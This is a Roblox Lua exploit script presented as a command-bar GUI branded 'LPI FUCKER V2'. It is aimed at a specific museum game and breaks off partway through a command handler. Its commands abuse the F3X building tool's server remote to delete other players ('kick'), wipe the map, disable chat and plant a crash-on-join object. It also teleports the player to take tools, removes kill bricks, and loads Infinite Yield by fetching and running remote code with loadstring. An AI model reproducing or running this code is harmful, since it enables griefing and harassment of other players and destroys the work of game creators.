-- Gui to Lua
-- Version: 3.2

-- Instances:

local SearchGui = Instance.new("ScreenGui")
local CMDBAR = Instance.new("Frame")
local TextBox = Instance.new("TextBox")
local UIPadding = Instance.new("UIPadding")
local Shadows = Instance.new("Folder")
local AmbientShadow = Instance.new("ImageLabel")
local UICorner = Instance.new("UICorner")
local PenumbraShadow = Instance.new("ImageLabel")
local UICorner_2 = Instance.new("UICorner")
local UmbraShadow = Instance.new("ImageLabel")
local UICorner_3 = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local UICorner_4 = Instance.new("UICorner")
local TextButton = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local Shadows_2 = Instance.new("Folder")
local AmbientShadow_2 = Instance.new("ImageLabel")
local UICorner_6 = Instance.new("UICorner")
local PenumbraShadow_2 = Instance.new("ImageLabel")
local UICorner_7 = Instance.new("UICorner")
local UmbraShadow_2 = Instance.new("ImageLabel")
local UICorner_8 = Instance.new("UICorner")
local ImageLabel = Instance.new("ImageLabel")

--Properties:

SearchGui.Name = "SearchGui"
SearchGui.Parent = game.CoreGui
SearchGui.ResetOnSpawn = false

CMDBAR.Name = "CMDBAR"
CMDBAR.Parent = SearchGui
CMDBAR.AnchorPoint = Vector2.new(0.5, 0.5)
CMDBAR.BackgroundColor3 = Color3.fromRGB(38, 40, 43)
CMDBAR.BorderColor3 = Color3.fromRGB(0, 0, 0)
CMDBAR.BorderSizePixel = 0
CMDBAR.Position = UDim2.new(0.5, 0, 0.88220793, 0)
CMDBAR.Size = UDim2.new(0, 582, 0, 36)

TextBox.Parent = CMDBAR
TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BackgroundTransparency = 1.000
TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextBox.BorderSizePixel = 0
TextBox.Position = UDim2.new(0.00999999978, 0, 0.222000003, 0)
TextBox.Size = UDim2.new(0, 22, 0, 19)
TextBox.Font = Enum.Font.Code
TextBox.PlaceholderColor3 = Color3.fromRGB(178, 178, 178)
TextBox.PlaceholderText = "Type ' to execute a command"
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.TextSize = 14.000
TextBox.TextXAlignment = Enum.TextXAlignment.Left

UIPadding.Parent = TextBox
UIPadding.PaddingLeft = UDim.new(0, 10)

Shadows.Name = "Shadows"
Shadows.Parent = CMDBAR

AmbientShadow.Name = "AmbientShadow"
AmbientShadow.Parent = Shadows
AmbientShadow.AnchorPoint = Vector2.new(0.5, 0.5)
AmbientShadow.BackgroundTransparency = 1.000
AmbientShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
AmbientShadow.Position = UDim2.new(0.5, 0, 0.5, 3)
AmbientShadow.Size = UDim2.new(1, 5, 1, 5)
AmbientShadow.ZIndex = 0
AmbientShadow.Image = "rbxassetid://1316045217"
AmbientShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
AmbientShadow.ImageTransparency = 0.800
AmbientShadow.ScaleType = Enum.ScaleType.Slice
AmbientShadow.SliceCenter = Rect.new(10, 10, 118, 118)

UICorner.CornerRadius = UDim.new(0, 129312)
UICorner.Parent = AmbientShadow

PenumbraShadow.Name = "PenumbraShadow"
PenumbraShadow.Parent = Shadows
PenumbraShadow.AnchorPoint = Vector2.new(0.5, 0.5)
PenumbraShadow.BackgroundTransparency = 1.000
PenumbraShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
PenumbraShadow.Position = UDim2.new(0.5, 0, 0.5, 1)
PenumbraShadow.Size = UDim2.new(1, 18, 1, 18)
PenumbraShadow.ZIndex = 0
PenumbraShadow.Image = "rbxassetid://1316045217"
PenumbraShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
PenumbraShadow.ImageTransparency = 0.880
PenumbraShadow.ScaleType = Enum.ScaleType.Slice
PenumbraShadow.SliceCenter = Rect.new(10, 10, 118, 118)

UICorner_2.CornerRadius = UDim.new(0, 129312)
UICorner_2.Parent = PenumbraShadow

UmbraShadow.Name = "UmbraShadow"
UmbraShadow.Parent = Shadows
UmbraShadow.AnchorPoint = Vector2.new(0.5, 0.5)
UmbraShadow.BackgroundTransparency = 1.000
UmbraShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
UmbraShadow.Position = UDim2.new(0.5, 0, 0.5, 6)
UmbraShadow.Size = UDim2.new(1, 10, 1, 10)
UmbraShadow.ZIndex = 0
UmbraShadow.Image = "rbxassetid://1316045217"
UmbraShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
UmbraShadow.ImageTransparency = 0.860
UmbraShadow.ScaleType = Enum.ScaleType.Slice
UmbraShadow.SliceCenter = Rect.new(10, 10, 118, 118)

UICorner_3.CornerRadius = UDim.new(0, 129312)
UICorner_3.Parent = UmbraShadow

TextLabel.Parent = CMDBAR
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.0171821304, 0, 0, 0)
TextLabel.Size = UDim2.new(0.972508609, 0, -0.0263159014, 50)
TextLabel.Font = Enum.Font.Code
TextLabel.Text = "MADE BY CREYSOUND"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 11.000
TextLabel.TextStrokeTransparency = 0.000
TextLabel.TextXAlignment = Enum.TextXAlignment.Left
TextLabel.TextYAlignment = Enum.TextYAlignment.Bottom

TextLabel_2.Parent = CMDBAR
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0.0171821304, 0, 0, 0)
TextLabel_2.Size = UDim2.new(0.972508609, 0, -0.0263159014, 50)
TextLabel_2.Font = Enum.Font.Code
TextLabel_2.Text = "LPI FUCKER V2 UNRELEASED"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 11.000
TextLabel_2.TextStrokeTransparency = 0.000
TextLabel_2.TextXAlignment = Enum.TextXAlignment.Right
TextLabel_2.TextYAlignment = Enum.TextYAlignment.Bottom

UICorner_4.CornerRadius = UDim.new(0, 99999)
UICorner_4.Parent = CMDBAR

TextButton.Parent = CMDBAR
TextButton.BackgroundColor3 = Color3.fromRGB(38, 40, 43)
TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(1.01546395, 0, 0, 0)
TextButton.Size = UDim2.new(0, 36, 0, 36)
TextButton.Visible = false
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = ""
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextSize = 14.000

UICorner_5.CornerRadius = UDim.new(0, 129312)
UICorner_5.Parent = TextButton

Shadows_2.Name = "Shadows"
Shadows_2.Parent = TextButton

AmbientShadow_2.Name = "AmbientShadow"
AmbientShadow_2.Parent = Shadows_2
AmbientShadow_2.AnchorPoint = Vector2.new(0.5, 0.5)
AmbientShadow_2.BackgroundTransparency = 1.000
AmbientShadow_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
AmbientShadow_2.Position = UDim2.new(0.5, 0, 0.5, 3)
AmbientShadow_2.Size = UDim2.new(1, 5, 1, 5)
AmbientShadow_2.ZIndex = 0
AmbientShadow_2.Image = "rbxassetid://1316045217"
AmbientShadow_2.ImageColor3 = Color3.fromRGB(0, 0, 0)
AmbientShadow_2.ImageTransparency = 0.800
AmbientShadow_2.ScaleType = Enum.ScaleType.Slice
AmbientShadow_2.SliceCenter = Rect.new(10, 10, 118, 118)

UICorner_6.CornerRadius = UDim.new(0, 129312)
UICorner_6.Parent = AmbientShadow_2

PenumbraShadow_2.Name = "PenumbraShadow"
PenumbraShadow_2.Parent = Shadows_2
PenumbraShadow_2.AnchorPoint = Vector2.new(0.5, 0.5)
PenumbraShadow_2.BackgroundTransparency = 1.000
PenumbraShadow_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
PenumbraShadow_2.Position = UDim2.new(0.5, 0, 0.5, 1)
PenumbraShadow_2.Size = UDim2.new(1, 18, 1, 18)
PenumbraShadow_2.ZIndex = 0
PenumbraShadow_2.Image = "rbxassetid://1316045217"
PenumbraShadow_2.ImageColor3 = Color3.fromRGB(0, 0, 0)
PenumbraShadow_2.ImageTransparency = 0.880
PenumbraShadow_2.ScaleType = Enum.ScaleType.Slice
PenumbraShadow_2.SliceCenter = Rect.new(10, 10, 118, 118)

UICorner_7.CornerRadius = UDim.new(0, 129312)
UICorner_7.Parent = PenumbraShadow_2

UmbraShadow_2.Name = "UmbraShadow"
UmbraShadow_2.Parent = Shadows_2
UmbraShadow_2.AnchorPoint = Vector2.new(0.5, 0.5)
UmbraShadow_2.BackgroundTransparency = 1.000
UmbraShadow_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
UmbraShadow_2.Position = UDim2.new(0.5, 0, 0.5, 6)
UmbraShadow_2.Size = UDim2.new(1, 10, 1, 10)
UmbraShadow_2.ZIndex = 0
UmbraShadow_2.Image = "rbxassetid://1316045217"
UmbraShadow_2.ImageColor3 = Color3.fromRGB(0, 0, 0)
UmbraShadow_2.ImageTransparency = 0.860
UmbraShadow_2.ScaleType = Enum.ScaleType.Slice
UmbraShadow_2.SliceCenter = Rect.new(10, 10, 118, 118)

UICorner_8.CornerRadius = UDim.new(0, 129312)
UICorner_8.Parent = UmbraShadow_2

ImageLabel.Parent = TextButton
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0.277777791, 0, 0.277777791, 0)
ImageLabel.Size = UDim2.new(0.416666657, 0, 0.416666657, 0)
ImageLabel.Image = "http://www.roblox.com/asset/?id=6035067832"

-- Scripts:

local function MQCYW_fake_script() -- TextLabel_2.Rainbower 
	local script = Instance.new('LocalScript', TextLabel_2)

	while wait() do
		script.Parent.TextColor3 = Color3.new(1,0,0)
		for i=1,15 do
			game:GetService("RunService").RenderStepped:wait()
			script.Parent.TextColor3 = Color3.new(script.Parent.TextColor3.r,script.Parent.TextColor3.g+(17/255),script.Parent.TextColor3.b)
		end
		for i=1,15 do
			game:GetService("RunService").RenderStepped:wait()
			script.Parent.TextColor3 = Color3.new(script.Parent.TextColor3.r-(17/255),script.Parent.TextColor3.g,script.Parent.TextColor3.b)
		end
		for i=1,15 do
			game:GetService("RunService").RenderStepped:wait()
			script.Parent.TextColor3 = Color3.new(script.Parent.TextColor3.r,script.Parent.TextColor3.g,script.Parent.TextColor3.b+(17/255))
		end
		for i=1,15 do
			game:GetService("RunService").RenderStepped:wait()
			script.Parent.TextColor3 = Color3.new(script.Parent.TextColor3.r,script.Parent.TextColor3.g-(17/255),script.Parent.TextColor3.b)
		end
		for i=1,15 do
			game:GetService("RunService").RenderStepped:wait()
			script.Parent.TextColor3 = Color3.new(script.Parent.TextColor3.r+(17/255),script.Parent.TextColor3.g,script.Parent.TextColor3.b)
		end
		for i=1,15 do
			game:GetService("RunService").RenderStepped:wait()
			script.Parent.TextColor3 = Color3.new(script.Parent.TextColor3.r,script.Parent.TextColor3.g,script.Parent.TextColor3.b-(17/255))
		end
	end
end
coroutine.wrap(MQCYW_fake_script)()
local function TTZT_fake_script() -- CMDBAR.LocalScript 
	local script = Instance.new('LocalScript', CMDBAR)

	local F3XSpawnPad = nil
	local BTOOLSpawnPad = nil
	local HumanoidRootPart = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
	
	
	--SafePlate.CFrame = HumanoidRootPart.CFrame
	
	local gettool = function(...)
		local SafePlate = game.Workspace:WaitForChild("SafePlate")
		local freegamepass = workspace["LPI Museum V.2 By Cobleth"]["Free  game pass"]
		
		for i, v in pairs(SafePlate.Mesh.Value:GetChildren()) do
			if v.Bricks:FindFirstChild("Bar") then
				F3XSpawnPad = v
				print(F3XSpawnPad.Name)
			end
		end
	
		for i, v in pairs(SafePlate.Mesh.Value:GetChildren()) do
			if v.Bricks:FindFirstChild("Smooth Block Model") then
				if v.Bricks:FindFirstChild("Smooth Block Model").Color == Color3.fromRGB(13, 105, 172) then
					BTOOLSpawnPad = v
					print(BTOOLSpawnPad.Name)
				end
			end
		end
	
	
		HumanoidRootPart = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
		if ... == "F3X" then
			local Bar = F3XSpawnPad.Bricks:WaitForChild("Bar")
			local prevcframe = HumanoidRootPart.CFrame
			Bar.CanCollide = false
			HumanoidRootPart.CFrame = Bar.CFrame
			wait(.25)
			HumanoidRootPart.CFrame = prevcframe
		elseif ... == "Btools" then
			local Bar = BTOOLSpawnPad.Bricks:FindFirstChild("Smooth Block Model")
			local prevcframe = HumanoidRootPart.CFrame
			Bar.CanCollide = false
			HumanoidRootPart.CFrame = Bar.CFrame
			wait(.25)
			HumanoidRootPart.CFrame = prevcframe
	
		elseif ... == "GameCard" then 
			local Bar = freegamepass["game card"]["PUT THE WEAPON IN THIS BRICK"]
			local prevcframe = HumanoidRootPart.CFrame
			Bar.CanCollide = false
			HumanoidRootPart.CFrame = Bar.CFrame
			wait(.25)
			HumanoidRootPart.CFrame = prevcframe
		elseif ... == "Knife" then
			local Bar = freegamepass["knife"]["PUT THE WEAPON IN THIS BRICK"]
			local prevcframe = HumanoidRootPart.CFrame
			Bar.CanCollide = false
			HumanoidRootPart.CFrame = Bar.CFrame
			wait(.25)
			HumanoidRootPart.CFrame = prevcframe
		elseif ... == "ToySword" then
			local Bar = freegamepass["sword"]["PUT THE WEAPON IN THIS BRICK"]
			local prevcframe = HumanoidRootPart.CFrame
			Bar.CanCollide = false
			HumanoidRootPart.CFrame = Bar.CFrame
			wait(.25)
			HumanoidRootPart.CFrame = prevcframe
		elseif ... == "FFPotion" then
			local Bar = freegamepass["FF potion"]["PUT THE WEAPON IN THIS BRICK"]
			local prevcframe = HumanoidRootPart.CFrame
			Bar.CanCollide = false
			HumanoidRootPart.CFrame = Bar.CFrame
			wait(.25)
			HumanoidRootPart.CFrame = prevcframe
		elseif ... == "Noob" then
			local Bar = freegamepass["Noob"]["PUT THE WEAPON IN THIS BRICK"]
			local prevcframe = HumanoidRootPart.CFrame
			Bar.CanCollide = false
			HumanoidRootPart.CFrame = Bar.CFrame
			wait(.25)
			HumanoidRootPart.CFrame = prevcframe
		elseif ... == "ItemGiver" then
			local Bar = freegamepass["Item Giver"]["PUT THE WEAPON IN THIS BRICK"]
			local prevcframe = HumanoidRootPart.CFrame
			Bar.CanCollide = false
			HumanoidRootPart.CFrame = Bar.CFrame
			wait(.25)
			HumanoidRootPart.CFrame = prevcframe
	
	
	
	
	
	
		elseif ... == "all" or ... == "All" then
			local Bar = F3XSpawnPad.Bricks:WaitForChild("Bar")
			local prevcframe = HumanoidRootPart.CFrame
			Bar.CanCollide = false
			HumanoidRootPart.CFrame = Bar.CFrame
			wait(.25)
			HumanoidRootPart.CFrame = prevcframe
			local Bar = BTOOLSpawnPad.Bricks:FindFirstChild("Smooth Block Model")
			local prevcframe = HumanoidRootPart.CFrame
			Bar.CanCollide = false
			HumanoidRootPart.CFrame = Bar.CFrame
			wait(.25)
			HumanoidRootPart.CFrame = prevcframe
			local Bar = freegamepass["game card"]["PUT THE WEAPON IN THIS BRICK"]
			local prevcframe = HumanoidRootPart.CFrame
			Bar.CanCollide = false
			HumanoidRootPart.CFrame = Bar.CFrame
			wait(.25)
			HumanoidRootPart.CFrame = prevcframe
			local Bar = freegamepass["knife"]["PUT THE WEAPON IN THIS BRICK"]
			local prevcframe = HumanoidRootPart.CFrame
			Bar.CanCollide = false
			HumanoidRootPart.CFrame = Bar.CFrame
			wait(.25)
			HumanoidRootPart.CFrame = prevcframe
			local Bar = freegamepass["sword"]["PUT THE WEAPON IN THIS BRICK"]
			local prevcframe = HumanoidRootPart.CFrame
			Bar.CanCollide = false
			HumanoidRootPart.CFrame = Bar.CFrame
			wait(.25)
			HumanoidRootPart.CFrame = prevcframe
			local Bar = freegamepass["FF potion"]["PUT THE WEAPON IN THIS BRICK"]
			local prevcframe = HumanoidRootPart.CFrame
			Bar.CanCollide = false
			HumanoidRootPart.CFrame = Bar.CFrame
			wait(.25)
			HumanoidRootPart.CFrame = prevcframe
			local Bar = freegamepass["Noob"]["PUT THE WEAPON IN THIS BRICK"]
			local prevcframe = HumanoidRootPart.CFrame
			Bar.CanCollide = false
			HumanoidRootPart.CFrame = Bar.CFrame
			wait(.25)
			HumanoidRootPart.CFrame = prevcframe
			local Bar = freegamepass["Item Giver"]["PUT THE WEAPON IN THIS BRICK"]
			local prevcframe = HumanoidRootPart.CFrame
			Bar.CanCollide = false
			HumanoidRootPart.CFrame = Bar.CFrame
			wait(.25)
			HumanoidRootPart.CFrame = prevcframe
		end
	end
	
	
	
	
	
	
	
	
	local tospawn = function()
		HumanoidRootPart = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
		HumanoidRootPart.CFrame = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	end
	
	local tosecretspawn = function()
		HumanoidRootPart = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
		HumanoidRootPart.CFrame = CFrame.new(-23833.7715, 40.3003426, -132.2677, 0.999337018, -2.71821623e-08, -0.0364074148, 2.33046045e-08, 1, -1.06928994e-07, 0.0364074148, 1.06009644e-07, 0.999337018)
	end
	
	local removekillbricks = function()
		for _, killbrick in pairs(workspace:GetChildren()) do
			if killbrick.Name == "lava" or killbrick.Name == "Poison" or killbrick.Name == "NormalDeadlyBrick" or killbrick.Name == "Explosion_Brick" or killbrick.Name == "Elec" then
				killbrick:Destroy()
			end
		end
	
		if workspace["kill bricks"] then
			workspace["kill bricks"]:Destroy()
		end
	end
	
	--[[
	local disablekillbricks = function()
		for _, killbrick in pairs(workspace:GetChildren()) do
			if killbrick.Name == "lava" or killbrick.Name == "Poison" or killbrick.Name == "NormalDeadlyBrick" or killbrick.Name == "Explosion_Brick" or killbrick.Name == "Elec" then
				for _, _script in pairs(killbrick:GetChildren()) do
					if _script.ClassName == "Script" then
						_script:Destroy()
					end
				end
			end
		end
		
		for _, killbrick in pairs(workspace["kill bricks"]:GetChildren()) do
			if killbrick.Name == "lava" or killbrick.Name == "Poison" or killbrick.Name == "NormalDeadlyBrick" or killbrick.Name == "Explosion_Brick" or killbrick.Name == "Elec" then
				for _, _script in pairs(killbrick:GetChildren()) do
					if _script.ClassName == "Script" then
						_script:Destroy()
					end
				end
			end
		end
	end
	]]
	
	
	local antifall = function()
		local part = Instance.new("Part", workspace)
		part.Size = Vector3.new(2048,100,2048)
		part.Position = Vector3.new(0, -400, 0)
		-- part.Color3 = Color3.new(0, 255, 0)
		part.Anchored = true
		part.Transparency = 0.5
		part.Locked = true
	
		game["Run Service"].RenderStepped:Connect(function()
			part.Position = Vector3.new(game.Players.LocalPlayer.Character.Head.Position.X, -400, game.Players.LocalPlayer.Character.Head.Position.Z)
		end)
	end
	
	local deadlands = function()
		HumanoidRootPart = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
		HumanoidRootPart.CFrame = CFrame.new(9999999999999999999999999999999999,9999999999999999999999999999999999,9999999999999999999999999999999999)
	end
	
	local round = function(num, numDecimalPlaces)
		local mult = 10^(numDecimalPlaces or 0)
		return math.floor(num * mult + 0.5) / mult
	end
	
	local GetPath = function()
		local ToolName = "F3X" or "Building Tools"
		if not (game.Players.LocalPlayer.Character:FindFirstChild(ToolName) or game.Players.LocalPlayer.Backpack:FindFirstChild(ToolName)) then
			local asdada = Instance.new("Message", workspace)
			asdada.Text = "You need f3x for that! (getting f3x if theres one...)"
			asdada.Parent = workspace
			game.Debris:AddItem(asdada, 3)
			gettool("F3X")
			wait()
		end
		
		local Tool = game.Players.LocalPlayer.Character:FindFirstChild(ToolName) or game.Players.LocalPlayer.Backpack:FindFirstChild(ToolName)
		return Tool
	end
	
	local Delete = function(instance, tool)
		tool:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction"):InvokeServer("UndoRemove", {instance})
		
	end
	
	local destroy = function(ins)
		coroutine.wrap(function()
			local Tool = GetPath()
			local plr = game.Players.LocalPlayer
	
			if Tool.Parent == plr.Backpack then
				Tool.Parent = plr.Character
				wait()
				Delete(ins, Tool)
				wait()
				Tool.Parent = plr.Backpack
			elseif Tool.Parent == plr.Character then
				Delete(ins, Tool)
			end
		end)()
	end
	
	local GetPlayer = function(Table)
		local Found = {}
		for i,v in pairs(Table) do
			if Table[i] == true then
				table.insert(Found, game.Players[i])
			end
		end
		return Found
	end
	
	local FindPlayer = function(PlayerString)
	
	--[[	if "all" == string.lower(PlayerString) then
			return game.Players:GetPlayers()
		end
	
		if "others" == string.lower(PlayerString) then
			local PlayerTable = {}
			for i, v in pairs(game.Players:GetPlayers()) do
				if v.Name ~= game.Players.LocalPlayer.Name then
					table.insert(PlayerTable, v)
				end
			end
			return PlayerTable
		end]]
	
		--[[if "me" == string.lower(PlayerString) then
			return game.Players.LocalPlayer
		end]]
	
		--[[if "random" == string.lower(PlayerString) then
			local RandomIndex = math.random(1, #game.Players:GetPlayers())
			return game.Players:GetPlayers()[RandomIndex]
		end]]
	
		for i, v in pairs(game.Players:GetPlayers()) do
			if PlayerString:lower() == (v.Name:lower()):sub(1, #PlayerString) then
				return v
			end
		end
	
	end
	
	Slock = false
	
	
	local scroll = script.Parent.ScrollingFrame -- CHANGE THIS TO YOUR SCROLLING FRAME
	local textBox = script.Parent.TextBox -- CHANGE THIS TO YOUR TEXT BOX
	
	game.Players.LocalPlayer:GetMouse().KeyDown:connect(function(Key)
		if Key == [[']] then
			wait()
			textBox:CaptureFocus()
		end
	end)
	
	
	textBox.FocusLost:Connect(function(enterPressed)
		if enterPressed then
			if textBox.Text == "iy" or textBox.Text == "infy" or textBox.Text == "iyield" or textBox.Text == "infiniteyield" then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
			elseif textBox.Text == "ti" or textBox.Text == "island" or textBox.Text == "toisland" then
				tospawn()
			elseif textBox.Text == "tm" or textBox.Text == "museum" or textBox.Text == "tomuseum" then
				tosecretspawn()
			elseif textBox.Text == "td" or textBox.Text == "deadlands" or textBox.Text == "todeadlands" then
				deadlands()
			elseif textBox.Text == "gtall" or textBox.Text == "alltools" then
				gettool("all")
			elseif textBox.Text == "ct" or textBox.Text == "tptool" then
				local TpTool = Instance.new("Tool")
				TpTool.Name = "Teleport Tool"
				TpTool.RequiresHandle = false
				TpTool.Parent = game.Players.LocalPlayer.Backpack
				TpTool.Activated:Connect(function()
					local Char = game.Players.LocalPlayer.Character or workspace:FindFirstChild(game.Players.LocalPlayer.Name)
					local HRP = Char and Char:FindFirstChild("HumanoidRootPart")
					if not Char or not HRP then
						return warn("Failed to find HumanoidRootPart")
					end
					HRP.CFrame = CFrame.new(game.Players.LocalPlayer:GetMouse().Hit.X, game.Players.LocalPlayer:GetMouse().Hit.Y + 3, game.Players.LocalPlayer:GetMouse().Hit.Z, select(4, HRP.CFrame:components()))
				end)
			elseif textBox.Text == "f" or textBox.Text == "f3x" then
				gettool("F3X")
			elseif textBox.Text == "btool" or textBox.Text == "btools" or textBox.Text == "buildingtools" then
				gettool("Btools")
			elseif textBox.Text == "gc" or textBox.Text == "gamecard" then
				gettool("GameCard")
			elseif textBox.Text == "k" or textBox.Text == "knife" then
				gettool("Knife")
			elseif textBox.Text == "ts" or textBox.Text == "toysword" then
				gettool("ToySword")
			elseif textBox.Text == "fp" or textBox.Text == "ffp" or textBox.Text == "ffpotion" then
				gettool("FFPotion")
			elseif textBox.Text == "n" or textBox.Text == "noob" then
				gettool("Noob")
			elseif textBox.Text == "ig" or textBox.Text == "itemgiver" then
				gettool("ItemGiver")
			elseif textBox.Text == "af" or textBox.Text == "antif" or textBox.Text == "antifall" then
				antifall()
			elseif textBox.Text == "nkb" or textBox.Text == "nokb" or textBox.Text == "nokillb" or textBox.Text == "nokillbrick" or textBox.Text == "nokillbricks" or textBox.Text == "antikillbrick" or textBox.Text == "antikb" or textBox.Text == "abk" then
				removekillbricks()
			elseif textBox.Text == "c" or textBox.Text == "cmds" then
				print("--------------------")
				warn("COMMANDS ARE:")
				--prints out every command in the scrollingframe
				for _, v in pairs(script.Parent.ScrollingFrame:GetChildren()) do
					if v:IsA("TextButton") then
						print(v.Text)
					end
				end
				print("--------------------")
			elseif textBox.Text:sub(1, 4) == "kick" then
				-- Extract the player's name from the textBox.Text
				local half = textBox.Text:match("kick (%w+)")
				if half == "others" then
					-- Check if a valid player name was extracted
					-- Find the player by name
					--local player = game.Players:WaitForChild(tostring(playerName))
					--print(player.Name)
					local plr = game.Players.LocalPlayer
					-- Check if the player exists
					--if player then
					-- Kick the player
					coroutine.wrap(function()
						local Tool = GetPath()
						local function Task()
							for _, player in pairs(game.Players:GetChildren()) do
								if player.Name == plr.Name then else
									Delete(player, Tool)
								end
	
							end
						end
							if Tool.Parent == plr.Backpack then
								Tool.Parent = plr.Character
								wait()
								Task()
								wait()
								Tool.Parent = plr.Backpack
							elseif Tool.Parent == plr.Character then
								Task()
							end	
						end)()
				else
	
					local playerName = FindPlayer(half)
					-- Check if a valid player name was extracted
					-- Find the player by name
					local player = game.Players:WaitForChild(tostring(playerName))
					--print(player.Name)
					local plr = game.Players.LocalPlayer
					-- Check if the player exists
					--if player then
					-- Kick the player
					coroutine.wrap(function()
						local Tool = GetPath()
						local function Task()
							Delete(player, Tool)
	
						end
						if Tool.Parent == plr.Backpack then
							Tool.Parent = plr.Character
							wait()
							Task()
							wait()
							Tool.Parent = plr.Backpack
						elseif Tool.Parent == plr.Character then
							Task()
						end	
					end)()
					print(playerName .. " has been kicked from the game.")
				end
				--	print("Player not found: " .. playerName)
				--	end
			elseif textBox.Text == "rm" or textBox.Text == "removemap" then
				local plr = game.Players.LocalPlayer
	
				coroutine.wrap(function()
					
					wait(.5)
					coroutine.wrap(function()
						local Tool = GetPath()
						local function Task()
							local Gearboards = {
								workspace:FindFirstChild("made by FoxBin"), 
								workspace:FindFirstChild("made by FoxBin1"),
								workspace:FindFirstChild("made byFoxBin MK2"),
								workspace:FindFirstChild("made by FoxBinMK4"),
								workspace:FindFirstChild("made by FoxBinMK6"),
								workspace:FindFirstChild("GearBoardManagerModel"),
								workspace:FindFirstChild("LPI Museum V.2 By Cobleth"),
								workspace:FindFirstChild("FoxBin'sDjBoard"),
								
								
							}
							for i,v in ipairs(Gearboards) do
								if v then
									Delete(v, Tool)
								end
							end
						end
						if Tool.Parent == plr.Backpack then
							Tool.Parent = plr.Character
							wait()
							Task()
							wait()
							Tool.Parent = plr.Backpack
						elseif Tool.Parent == plr.Character then
							Task()
						end
					end)()
					
					wait(.5)
					coroutine.wrap(function()
						local Tool = GetPath()
						local function Task()
							local F3XGiver
							local SafePlate = workspace:FindFirstChild("SafePlate")
							for i,v in pairs(SafePlate.Mesh.Value:GetDescendants()) do
								if v.Name == "Bricks" and v:FindFirstChild("Bar") then
									F3XGiver = v.Parent
								end
							end
							Delete(F3XGiver, Tool)
						end
						if Tool.Parent == plr.Backpack then
							Tool.Parent = plr.Character
							wait()
							Task()
							wait()
							Tool.Parent = plr.Backpack
						elseif Tool.Parent == plr.Character then
							Task()
						end
					end)()
					wait(.5)
					coroutine.wrap(function()
						local Tool = GetPath()
						local function Task()
							local BtoolsGiver
							local SafePlate = workspace:FindFirstChild("SafePlate")
							for i,v in pairs(SafePlate.Mesh.Value:GetDescendants()) do
								if v.Name == "Bricks" and not v:FindFirstChild("Bar") then
									BtoolsGiver = v.Parent
								end
							end
							Delete(BtoolsGiver, Tool)
						end
						if Tool.Parent == plr.Backpack then
							Tool.Parent = plr.Character
							wait()
							Task()
							wait()
							Tool.Parent = plr.Backpack
						elseif Tool.Parent == plr.Character then
							Task()
						end
					end)()
					wait(.5)
					coroutine.wrap(function()
						local Tool = GetPath()
						local function Task()
							local Baseplate = workspace:FindFirstChild("Baseplate")
							Delete(Baseplate, Tool)
						end
						if Tool.Parent == plr.Backpack then
							Tool.Parent = plr.Character
							wait()
							Task()
							wait()
							Tool.Parent = plr.Backpack
						elseif Tool.Parent == plr.Character then
							Task()
						end
					end)()
					wait(.5)
					coroutine.wrap(function()
						local Tool = GetPath()
						local function Task()
							local ModelInserter = workspace:FindFirstChild("FoxBinMK5")
							Delete(ModelInserter, Tool)
						end
						if Tool.Parent == plr.Backpack then
							Tool.Parent = plr.Character
							wait()
							Task()
							wait()
							Tool.Parent = plr.Backpack
						elseif Tool.Parent == plr.Character then
							Task()
						end
					end)()
				end)()
			elseif textBox.Text == "slock" or textBox.Text == "serverlock" then
				Slock = true
			elseif textBox.Text == "noslock" or textBox.Text == "noserverlock" then
				Slock = false
			elseif textBox.Text == "mc" or textBox.Text == "mutechat" then
				destroy(game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest)
			elseif textBox.Text == "delm" or textBox.Text == "delmenu" or textBox.Text == " deletemenu" then
				destroy(game.StarterGui:WaitForChild("CoreGui"))
			elseif textBox.Text == "coj" or textBox.Text == "crashonjoin" then
				destroy(game.ReplicatedStorage["      "])
			elseif textBox.Text == "re" or textBox.Text == "reset" then
				game:getService("ReplicatedStorage"):WaitForChild("StatAPI"):FireServer("LoadChar", 1);
			elseif textBox.Text:sub(1, 10) == "removefame" then
